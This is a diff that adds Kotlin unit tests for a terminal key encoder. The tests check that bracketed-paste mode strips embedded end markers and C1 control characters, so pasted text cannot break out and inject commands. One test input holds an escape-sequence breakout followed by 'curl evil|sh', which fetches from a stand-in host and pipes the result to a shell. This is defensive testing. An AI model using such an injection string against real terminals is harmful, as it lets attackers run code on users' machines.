@@ -328,6 +328,28 @@ class TerminalKeyEncoderTest {
     }
 
     @Test
+    fun `bracketed paste strips embedded end marker ESC and C1 controls`() {
+        // RC-12: 本文中の`ESC[201~`(および8bit CSI U+009B)でbracketed pasteを抜けて
+        // コマンドを注入できないこと。Rust側`terminal_commit_text_bytes`のテストと同じ入力。
+        val bytes = TerminalKeyEncoder.commitTextBytes("x\u001B[201~curl evil|sh\u009B\r", bracketedPasteMode = true)
+        val start = byteArrayOf(0x1B, 0x5B, 0x32, 0x30, 0x30, 0x7E)
+        val end = byteArrayOf(0x1B, 0x5B, 0x32, 0x30, 0x31, 0x7E)
+        assertArrayEquals(start, bytes.copyOfRange(0, 6))
+        assertArrayEquals(end, bytes.copyOfRange(bytes.size - 6, bytes.size))
+        val inner = bytes.copyOfRange(6, bytes.size - 6)
+        assertArrayEquals("x[201~curl evil|sh\r".toByteArray(Charsets.UTF_8), inner)
+    }
+
+    @Test
+    fun `non-bracketed commit text is not sanitized`() {
+        // bracketed paste無効時は従来どおりそのまま送る(IMEで意図的に送るESC等を壊さない)。
+        assertArrayEquals(
+            "a\u001Bb".toByteArray(Charsets.UTF_8),
+            TerminalKeyEncoder.commitTextBytes("a\u001Bb", bracketedPasteMode = false),
+        )
+    }
+
+    @Test
     fun `emoji single codepoint does not wrap even with bracketedPasteMode`() {
         val emoji = "😀"  // 😀 — 2 UTF-16 chars, 1 codepoint
         val bytes = TerminalKeyEncoder.commitTextBytes(emoji, bracketedPasteMode = true)
